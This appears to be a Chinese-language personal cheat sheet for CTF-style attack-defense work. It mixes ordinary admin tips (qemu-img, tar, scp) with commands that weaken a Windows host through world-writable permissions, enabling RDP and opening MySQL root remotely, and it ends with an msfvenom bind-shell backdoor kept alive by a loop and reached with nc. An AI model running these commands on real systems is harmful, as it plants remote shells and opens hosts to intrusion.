# note1
```
cacls.exe c:\www /e /t /g everyone:F #把c盘设置为everyone有所有权限
cacls.exe d: /e /t /g admin:F #把d盘设置为admin有所有权限
```
以下命令可以实现在命令行中设置用户属性为密码永不过期（需要安装wmic.exe环境，执行命令时，请将半角双引号中的“用户名”换成实际的用户名，windows7中验证通过）：
```
wmic.exe UserAccount Where Name="用户名" Set PasswordExpires="false"
```

03 xp直接开3389 不用重启：
```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

mysql如何开启远程连接

```
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;
```
使用“flush privileges;”命令刷新刚才修改的权限，使其生效。

qcow2压缩办法：
```
qemu-img convert -c -O qcow2 win.qcow2 ocr.qcow2
```
其中ocr.qcow2是你的目标镜像

```
打包压缩
tar -zcvf AWD.tar.gz AWD/
解压
tar -zxvf AWD.tar.gz
```
shell屏蔽错误的输出：
```
echo "test" > /root/file 2>/dev/null
上面的命令执行，会首先>/root/file创建文件，发现没权限便报错直接退出，不会继续其他操作
    （echo "test" > /root/file）2>/dev/null
这个就会把（）里面的所有错误输出导向/dev/null
```
shell屏蔽所有输出：
```
（echo "test" > /root/file）2>/dev/null >/dev/null 
```

#### ssh sftp
ssh:
```
ssh -p 2211 hack@172.16.2.234
```
sftp:
```
root@kali:~# tree ./test
./test
├── 1
│   ├── 1.py
│   ├── banner.py
│   ├── scan.py
│   ├── shodan.py
│   ├── ssh.py
│   └── ww.py
├── 1.py
├── banner.py
├── scan.py
├── shodan.py
├── ssh.py
└── ww.py

root@kali:~# scp -P 2211 -r ./test hack@172.16.2.234:/tmp/tt
//-大写P指定ssh端口号 -r递归目录
hack@172.16.2.234's password: 
Could not chdir to home directory /home/hack: No such file or directory
banner.py                                     100%  606   212.9KB/s   00:00    
shodan.py                                     100%  116    26.8KB/s   00:00    
1.py                                          100%   13KB   2.8MB/s   00:00    
ww.py                                         100% 2658     1.1MB/s   00:00    
ssh.py                                        100%  738   318.3KB/s   00:00    
scan.py                                       100%  442    64.8KB/s   00:00    
banner.py                                     100%  606   253.2KB/s   00:00    
shodan.py                                     100%  116    25.6KB/s   00:00    
1.py                                          100%   13KB   2.9MB/s   00:00    
ww.py                                         100% 2658   642.8KB/s   00:00    
ssh.py                                        100%  738   169.9KB/s   00:00    
scan.py                                       100%  442   201.3KB/s   00:00    
root@kali:~# 

root@kali:~# scp -P 2211 ./1.py hack@172.16.2.234:/tmp/333.py
hack@172.16.2.234's password: 
Could not chdir to home directory /home/hack: No such file or directory
1.py                                          100%   13KB   1.4MB/s   00:00    
root@kali:~# 


ssh -p 2211 hack@172.16.2.234

$ ls -al /tmp/tt
total 48
drwxr-xr-x 3 hack hack  4096 Apr 12 05:06 .
drwxrwxrwt 4 root root  4096 Apr 12 05:06 ..
drwxr-xr-x 2 hack hack  4096 Apr 12 05:06 1
-rw-r--r-- 1 hack hack 13345 Apr 12 05:06 1.py
-rw-r--r-- 1 hack hack   606 Apr 12 05:06 banner.py
-rw-r--r-- 1 hack hack   442 Apr 12 05:06 scan.py
-rw-r--r-- 1 hack hack   116 Apr 12 05:06 shodan.py
-rw-r--r-- 1 hack hack   738 Apr 12 05:06 ssh.py
-rw-r--r-- 1 hack hack  2658 Apr 12 05:06 ww.py
```

### linux监听端口后门

```
msfvenom -l|grep linux
msfvenom -p linux/x64/shell_bind_tcp LPORT=1234 -f elf >/tmp/ss
while true;do /tmp/ss;done

nc 192.168.2.1 1234
```

